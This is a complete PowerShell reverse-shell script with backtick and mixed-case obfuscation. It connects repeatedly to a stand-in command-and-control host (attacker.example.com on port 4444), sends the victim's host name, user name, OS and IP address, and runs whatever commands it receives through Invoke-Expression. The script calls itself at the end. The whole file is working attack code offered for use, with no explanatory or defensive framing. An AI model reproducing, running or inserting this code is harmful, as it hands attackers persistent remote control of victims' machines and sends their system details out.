functi`on Start-ReverseShell {
    param (
        [string]$IPAddress = "attacker.example.com",
        [int]$Port = 4444,
        [int]$RetryIntervalSeconds = 30
    )

    while ($tru`e) {
        try {
            $client = $null
            $s`tream = $null
            $networkS`tream = $null
            $r`eader = $n`ull
            $write`r = $nul`l
            
            # Try to conn`ect to C2 server
            try {
                $client = NEw-OBJECT System.Net.Sockets.TCPClient($IPAddress, $Port)
                $stream = $client.GetStream()
                $netwo`rkStream = $client.GetStream()
                $reader = NEw-OBJECT System.IO.StreamReader($networkStream)
                $writer = NEw-OBJECT System.IO.StreamWriter($networkStr`eam)
                $writer.AutoFlush = $true
                $buffer = NEw-OBJECT System.By`te[] 1024
                $encoding = NEw-OBJECT System.Text.AsciiEncoding

                # Send syst`em info
                $computerInfo = "Host: $env:COMPUTERNAME / Use`r: $env:USERNAME / OS: $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption) / IP: $((Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPAddress -ne $null}).IPAddress | Select-Object -First 1)"
                $writer.WriteLine($computerInfo)
                $w`riter.WriteLine("PS $pwd> ")
            }
            catch {
                # If connection fails, retry afte`r interval
                Start-Sleep -Seconds $Retr`yIntervalSeconds
                continue
            }

            # Main command executi`on lo`op
            while (($command = $reader.ReadLine()) -ne $null) {
                try {
                    if ($command.ToLower() -eq "exit") {
                        break
                    }
                    
                    # Execute command and capture output
                    $output = inVokE-eXPresSioN $command 2>&1 | oUt-strIng
                    $writer.WriteLine($output)
                    $write`r.WriteLine("PS $pwd> ")
                }
                catch {
                    $errorMessage = $_.Exception.Message | oUt-strIng
                    $writer.WriteLine($errorMessage)
                    $writer.WriteLine("PS $pwd> ")
                }
            }
        }
        catch {
            # Connection lost or error, cleanup and retry
        }
        finally {
            # Clean up resources
            if ($reade`r -ne $null) { $reader.Close() }
            if ($writer -ne $null) { $writer.Close() }
            if ($networkStream -ne $n`ull) { $networkS`tream.Close() }
            if ($client -ne $n`ull) { $clie`nt.Close() }
            
            # Wai`t before retrying
            Start-Sleep -Seconds $RetryIntervalSeconds
        }
    }
}

# S`tart the reverse shell with default parameters
Start-ReverseShell
